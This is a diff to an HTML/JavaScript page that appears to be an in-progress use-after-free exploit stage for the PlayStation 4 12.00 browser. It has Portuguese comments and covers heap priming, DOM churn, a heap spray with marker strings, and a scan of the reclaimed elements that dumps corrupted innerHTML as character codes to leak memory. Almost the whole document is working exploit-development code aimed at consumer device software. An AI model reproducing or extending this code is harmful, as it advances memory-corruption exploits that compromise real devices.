@@ -1,12 +1,13 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Leak Deep Scan</title>
+<title>PS4 12.00 - UAF Bucket Scan (Real Leak Stage)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Leak Deep Scan (Desync + Raw Scan)</h2>
+<h2>UAF Bucket Scan (Real Corruption Detection)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,12 +22,12 @@ function log(msg){
 }
 
 // ==========================
-// 💣 HEAP PRIMING (1 ARRAY)
+// 💣 HEAP PRIMING (ESSENCIAL)
 // ==========================
 function setupHeap(){
     let t = new Float64Array(8);
     t[0] = 0x1337;
-    window.__priming_array = t;
+    window.__priming = t;
 
     log("[*] heap primed (1 array)");
 }
@@ -57,7 +58,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 MONOTYPE RECLAIM
+// 💣 RECLAIM MONOTIPO
 // ==========================
 function preciseReclaim(size){
 
@@ -65,29 +66,20 @@ function preciseReclaim(size){
 
     let bucket = [];
 
-    // churn
+    // churn inicial
     for(let i=0;i<1500;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // spray homogêneo
+    // spray controlado
     for(let i=0;i<size;i++){
 
         let el = document.createElement("div");
 
         el.innerHTML =
-            "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+"_41414141_42424242_43434343</h1>";
-
-        Object.assign(el.style,{
-            background:"black",
-            width:"100%",
-            height:"100%",
-            position:"absolute",
-            top:"0",
-            left:"0"
-        });
+            "CTRL_"+i+"_41414141_42424242_43434343";
 
         document.body.appendChild(el);
         bucket.push(el);
@@ -97,121 +89,46 @@ function preciseReclaim(size){
 }
 
 // ==========================
-// 🔬 PROBE + LEAK PROFUNDO
+// 🔬 SCAN REAL DO HEAP
 // ==========================
-function deepProbe(fsTarget){
+function scanBucket(bucket){
 
-    log("---- PROBE ----");
+    log("---- BUCKET SCAN ----");
 
-    // ==========================
-    // DESYNC
-    // ==========================
-    try{
-        let html = fsTarget.innerHTML;
-        let text = fsTarget.textContent;
+    for(let i=0;i<bucket.length;i++){
 
-        log("[CHECK] innerHTML = "+html);
-        log("[CHECK] textContent = "+text);
+        let el = bucket[i];
 
-        if(html && text && !html.includes(text)){
-            log("[!!!] DESYNC REAL DETECTADO");
-        }
+        try{
+            let html = el.innerHTML;
 
-    }catch(e){
-        log("[UAF] innerHTML/text crash");
-    }
+            // esperado: CTRL_
+            if(!html.includes("CTRL_")){
 
-    // ==========================
-    // CHILD INFO
-    // ==========================
-    try{
-        let child = fsTarget.firstChild;
-        log("[CHECK] child = "+child);
-        log("[CHECK] nodeType = "+child?.nodeType);
-    }catch(e){
-        log("[UAF] child crash");
-    }
+                log("[!!!] POSSIVEL CORRUPÇÃO EM INDEX " + i);
+                log("[CORRUPTED] innerHTML = " + html);
 
-    // ==========================
-    // WRITE CONTROL
-    // ==========================
-    try{
-        fsTarget.innerHTML =
-            "<div id='x'>" +
-            "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" +
-            "</div>";
+                let preview = html.substring(0,100);
+                log("[PREVIEW] " + preview);
 
-        log("[PWN] write OK");
-    }catch(e){
-        log("[UAF] write crash");
-    }
+                let codes = [];
+                for(let j=0;j<preview.length;j++){
+                    codes.push(preview.charCodeAt(j));
+                }
 
-    // ==========================
-    // 🔥 LEAK EXPANDIDO
-    // ==========================
-    try{
-        let html = fsTarget.innerHTML;
-        let expanded = html.repeat(50);
+                log("[RAW] " + codes.slice(0,50));
 
-        log("[LEAK+] len = " + expanded.length);
-        log("[LEAK+] preview = " + expanded.substring(0,120));
-
-        let weird = [];
-
-        for(let i=0;i<expanded.length;i++){
-            let c = expanded.charCodeAt(i);
-
-            // fora de ASCII visível
-            if(c < 32 || c > 126){
-                weird.push(c);
+                return; // para no primeiro hit
             }
+
+        }catch(e){
+
+            log("[!!!] CRASH AO LER INDEX " + i);
+            return;
         }
-
-        if(weird.length > 0){
-            log("[!!!] BYTES NÃO ASCII: " + weird.slice(0,20));
-        }else{
-            log("[SCAN] apenas ASCII visível");
-        }
-
-    }catch(e){
-        log("[LEAK] erro scan profundo");
     }
 
-    // ==========================
-    // 🔬 RAW CHARCODE DUMP
-    // ==========================
-    try{
-        let raw = fsTarget.innerHTML;
-        let slice = raw.substring(0, 500);
-
-        let codes = [];
-
-        for(let i=0;i<slice.length;i++){
-            codes.push(slice.charCodeAt(i));
-        }
-
-        log("[RAW] charCodes = " + codes.slice(0,60));
-
-    }catch(e){
-        log("[RAW] erro leitura");
-    }
-
-    // ==========================
-    // OUTROS CHECKS
-    // ==========================
-    try{
-        let r = fsTarget.getBoundingClientRect();
-        log("[CHECK] rect = "+r.height);
-    }catch(e){
-        log("[UAF] rect crash");
-    }
-
-    try{
-        let p = fsTarget.parentNode;
-        log("[CHECK] parent = "+p);
-    }catch(e){
-        log("[UAF] parent crash");
-    }
+    log("[SCAN] nenhum bucket corrompido detectado");
 }
 
 // ==========================
@@ -230,23 +147,28 @@ function trigger(fsTarget){
 
     }catch(e){}
 
-    let sizes = [2000, 2200, 2500];
+    let sizes = [2000, 2500, 3000];
 
     sizes.forEach((size, idx)=>{
-        setTimeout(()=>preciseReclaim(size), idx*60);
-    });
 
-    setTimeout(()=>deepProbe(fsTarget), 10);
-    setTimeout(()=>deepProbe(fsTarget), 40);
-    setTimeout(()=>deepProbe(fsTarget), 80);
-    setTimeout(()=>deepProbe(fsTarget), 140);
-    setTimeout(()=>deepProbe(fsTarget), 220);
+        setTimeout(()=>{
+
+            let bucket = preciseReclaim(size);
+
+            // 🔥 janela crítica → scan rápido
+            setTimeout(()=>{
+                scanBucket(bucket);
+            }, 30);
+
+        }, idx * 80);
+
+    });
 
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
-    },400);
+    },600);
 
-    setTimeout(()=>location.reload(),600);
+    setTimeout(()=>location.reload(),800);
 }
 
 // ==========================
